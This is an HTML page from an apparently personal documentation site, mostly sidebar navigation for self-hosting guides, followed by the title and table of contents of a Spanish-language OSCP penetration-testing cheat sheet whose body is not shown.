        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
        
          
          <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Sonarqube
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_47">
            <span class="md-nav__icon md-icon"></span>
            Sonarqube
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sonarqube/docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sonarqube/gitlabIntegration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GitLab Integration
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
        
          
          <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Sshwifty
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_48">
            <span class="md-nav__icon md-icon"></span>
            Sshwifty
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sshwifty/sshwifty/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sshwifty
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_2" >
        
          
          <label class="md-nav__link" for="__nav_48_2" id="__nav_48_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Sshwifty
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_48_2">
            <span class="md-nav__icon md-icon"></span>
            Sshwifty
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sshwifty/sshwifty/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sshwifty Web SSH &amp; Telnet Client
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sshwifty/sshwifty/DEPENDENCIES/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dependencies used by Sshwifty
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Sshwifty/sshwifty/LICENSE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LICENSE
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
        
          
          <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Terraform
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_49">
            <span class="md-nav__icon md-icon"></span>
            Terraform
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Terraform/Terraform_examples/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Terraform examples
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50" >
        
          
          <label class="md-nav__link" for="__nav_50" id="__nav_50_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Traefic
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_50_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_50">
            <span class="md-nav__icon md-icon"></span>
            Traefic
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/Install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/Labels/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Labels
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/mailserverProxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mailserver behind Proxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/traf%2Bport/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traf+port
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50_6" >
        
          
          <label class="md-nav__link" for="__nav_50_6" id="__nav_50_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Docker traefik portainer
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_50_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_50_6">
            <span class="md-nav__icon md-icon"></span>
            Docker traefik portainer
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/docker-traefik-portainer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker container management with Traefik v2 and Portainer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/docker-traefik-portainer/TUTORIAL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker container management with Traefik v2 and Portainer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50_6_3" >
        
          
          <label class="md-nav__link" for="__nav_50_6_3" id="__nav_50_6_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Apps
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_50_6_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_50_6_3">
            <span class="md-nav__icon md-icon"></span>
            Apps
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Traefic/docker-traefik-portainer/apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51" >
        
          
          <label class="md-nav__link" for="__nav_51" id="__nav_51_label" tabindex="">
            
  
  <span class="md-ellipsis">
    UptimeKuma
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_51_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_51">
            <span class="md-nav__icon md-icon"></span>
            UptimeKuma
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../UptimeKuma/CODE_OF_CONDUCT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Contributor Covenant Code of Conduct
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../UptimeKuma/CONTRIBUTING/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Project Info
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../UptimeKuma/SECURITY/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Security Policy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51_4" >
        
          
          <label class="md-nav__link" for="__nav_51_4" id="__nav_51_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Src
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_51_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_51_4">
            <span class="md-nav__icon md-icon"></span>
            Src
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51_4_1" >
        
          
          <label class="md-nav__link" for="__nav_51_4_1" id="__nav_51_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Lang
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_51_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_51_4_1">
            <span class="md-nav__icon md-icon"></span>
            Lang
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../UptimeKuma/src/lang/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to translate
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_52" >
        
          
          <label class="md-nav__link" for="__nav_52" id="__nav_52_label" tabindex="">
            
  
  <span class="md-ellipsis">
    VPN
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_52_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_52">
            <span class="md-nav__icon md-icon"></span>
            VPN
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VPN/Tutorial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tutorial
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VPN/onlyVpnSSH/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    onlyVpnSSH
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VPN/troubleshoot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Troubleshoot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VPN/wg-easy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wg easy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VPN/wireguard/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wireguard
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_53" >
        
          
          <label class="md-nav__link" for="__nav_53" id="__nav_53_label" tabindex="">
            
  
  <span class="md-ellipsis">
    VSCode
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_53_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_53">
            <span class="md-nav__icon md-icon"></span>
            VSCode
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../VSCode/dockercompose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dockercompose
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_54" >
        
          
          <label class="md-nav__link" for="__nav_54" id="__nav_54_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Vault Hashicorp
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_54_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_54">
            <span class="md-nav__icon md-icon"></span>
            Vault Hashicorp
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Vault%20Hashicorp/Vault%20Agent%20%28Persistent%29%20Docker%20Compose%20Setup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vault Agent (Persistent) Docker Compose Setup
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_55" >
        
          
          <label class="md-nav__link" for="__nav_55" id="__nav_55_label" tabindex="">
            
  
  <span class="md-ellipsis">
    WSL
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_55_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_55">
            <span class="md-nav__icon md-icon"></span>
            WSL
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../WSL/enableSystemd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    enableSystemd
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../WSL/kali-wsl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    KALI WSL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../WSL/wlstroubleshoot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wlstroubleshoot
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_56" >
        
          
          <label class="md-nav__link" for="__nav_56" id="__nav_56_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Wireguard(VPN)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_56_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_56">
            <span class="md-nav__icon md-icon"></span>
            Wireguard(VPN)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Wireguard%28VPN%29/Tutorial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tutorial
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Wireguard%28VPN%29/onlyVpnSSH/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    onlyVpnSSH
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Wireguard%28VPN%29/troubleshoot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Troubleshoot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Wireguard%28VPN%29/wireguard/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wireguard
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_57" >
        
          
          <label class="md-nav__link" for="__nav_57" id="__nav_57_label" tabindex="">
            
  
  <span class="md-ellipsis">
    cyberSecurity
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_57_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_57">
            <span class="md-nav__icon md-icon"></span>
            cyberSecurity
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nmap Cheat Sheet 2024: All the Commands &amp; Flags
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cyberSecurity/nmapCheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nmap Cheat Sheet 2024: All the Commands &amp; Flags
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cyberSecurity/nuceli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nuclei: Automating Web Application and Network Service Testing [Cheat Sheet]
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_58" >
        
          
          <label class="md-nav__link" for="__nav_58" id="__nav_58_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Fail2ban
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_58_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_58">
            <span class="md-nav__icon md-icon"></span>
            Fail2ban
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../fail2ban/AdvancedSecOps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Guides - Setting Up and Securing a Compute Instance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../fail2ban/Install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Using Fail2Ban for SSH Brute-force Protection
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_59" >
        
          
          <label class="md-nav__link" for="__nav_59" id="__nav_59_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Forgejo
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_59_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_59">
            <span class="md-nav__icon md-icon"></span>
            Forgejo
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../forgejo/docker-compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../forgejo/docs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_60" >
        
          
          <label class="md-nav__link" for="__nav_60" id="__nav_60_label" tabindex="">
            
  
  <span class="md-ellipsis">
    mdEditor
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_60_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_60">
            <span class="md-nav__icon md-icon"></span>
            mdEditor
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../mdEditor/flatnotes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Flatnotes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_61" >
        
          
          <label class="md-nav__link" for="__nav_61" id="__nav_61_label" tabindex="">
            
  
  <span class="md-ellipsis">
    N8n
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_61_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_61">
            <span class="md-nav__icon md-icon"></span>
            N8n
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../n8n/compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../n8n/install%28docker%29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install(docker)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_62" >
        
          
          <label class="md-nav__link" for="__nav_62" id="__nav_62_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Pdf
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_62_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_62">
            <span class="md-nav__icon md-icon"></span>
            Pdf
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pdf/pdf-editor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pdf editor
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_63" >
        
          
          <label class="md-nav__link" for="__nav_63" id="__nav_63_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Watchover(docker)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_63_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_63">
            <span class="md-nav__icon md-icon"></span>
            Watchover(docker)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../watchover%28docker%29/docker-compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker compose
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#penetration-testing-with-kali-linux-pwk-course-and-offensive-security-certified-professional-oscp-cheat-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#indice-y-estructura-principal" class="md-nav__link">
    <span class="md-ellipsis">
      Índice y Estructura Principal
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="preparacion-para-el-oscp-by-s4vitar">Preparación para el OSCP (by s4vitar)<a class="headerlink" href="#preparacion-para-el-oscp-by-s4vitar" title="Permanent link">&para;</a></h1>
<p><img alt="OSCP Image" src="http://funkyimg.com/i/2MPB4.png" /></p>
<h4 id="penetration-testing-with-kali-linux-pwk-course-and-offensive-security-certified-professional-oscp-cheat-sheet">Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet<a class="headerlink" href="#penetration-testing-with-kali-linux-pwk-course-and-offensive-security-certified-professional-oscp-cheat-sheet" title="Permanent link">&para;</a></h4>
<h2 id="indice-y-estructura-principal">Índice y Estructura Principal<a class="headerlink" href="#indice-y-estructura-principal" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="#Antecedentes">Antecedentes - Experiencia Personal</a></li>
<li><a href="#buffer-overflow-windows">Buffer Overflow Windows (25 puntos)</a><ul>
<li><a href="#fuzzing">Fuzzing</a></li>
<li><a href="#calculando-el-offset">Calculando el Offset (Tamaño del Búffer)</a></li>
<li><a href="#controlando-el-registro-eip">Controlando el registro EIP</a></li>
<li><a href="#situando-y-asignando-espacio-al-shellcode">Situando y Asignando Espacio al Shellcode</a></li>
<li><a href="#detectando-los-badchars">Detectando los Badchars</a></li>
<li><a href="#generando-el-shellcode">Generando el Shellcode</a></li>
<li><a href="#salto-al-esp">Salto al ESP (Mona / Immunity Debugger)</a></li>
<li><a href="#mejorando-el-exploit">Mejorando el Exploit</a></li>
<li><a href="#reduciendo-el-size-y-acceso-por-powershell">Reduciendo el Size y Acceso por Powershell</a></li>
</ul>
</li>
<li>
<p><a href="#buffer-overflow-linux">Buffer Overflow Linux</a></p>
<ul>
<li><a href="#calculando-el-offset-en-linux">Calculando el Offset (Linux)</a></li>
<li><a href="#register-enumeration">Register Enumeration</a></li>
<li><a href="#jmp-esp-opcode">JMP ESP Opcode</a></li>
<li><a href="#jmp-eax-from-esp">JMP EAX From ESP</a></li>
<li><a href="#msfvenom-linux-payload">Msfvenom Linux Payload</a></li>
<li><a href="#ganando-acceso-al-sistema">Ganando Acceso al Sistema</a></li>
</ul>
</li>
<li>
<p><a href="#pentesting">Pentesting</a></p>
<ul>
<li><a href="#general">General</a></li>
<li><a href="#port-scanning">Port Scanning</a></li>
<li><a href="#Wfuzz">Wfuzz</a></li>
<li><a href="#Nikto">Nikto</a></li>
<li><a href="#snmp-enumeration">Enumeración SNMP</a></li>
<li><a href="#reverse-shell">Reverse Shell</a></li>
<li><a href="#spawning-a-tty-shell">Spawning a TTY Shell</a></li>
<li><a href="#compilado-de-exploits-para-windows">Compilado de Exploits para Windows</a></li>
<li><a href="#squid-proxy">Squid Proxy</a></li>
<li><a href="#metasploit-debugging">Metasploit Debugging</a></li>
<li><a href="#pentesting-web">Pentesting Web</a></li>
<li><a href="#lfi">LFI (Local File Inclusion)</a></li>
<li><a href="#lfi-code-examples">LFI (Local File Inclusion) Code Examples</a></li>
<li><a href="#rfi">RFI (Remote File Inclusion)</a></li>
<li><a href="#lfi-to-rce">LFI to RCE</a></li>
<li><a href="#lfi-to-rce-via-php-sessions">LFI to RCE via PHP Sessions</a></li>
<li><a href="#lfi-to-rce-via-environ">LFI to RCE via /proc/self/environ</a></li>
<li><a href="#lfi-rfi-using-wrappers">LFI RFI using Wrappers</a> </li>
<li><a href="#sqli">SQLI (SQL Inyection)</a>     </li>
<li><a href="#shellshock">Shellshock</a></li>
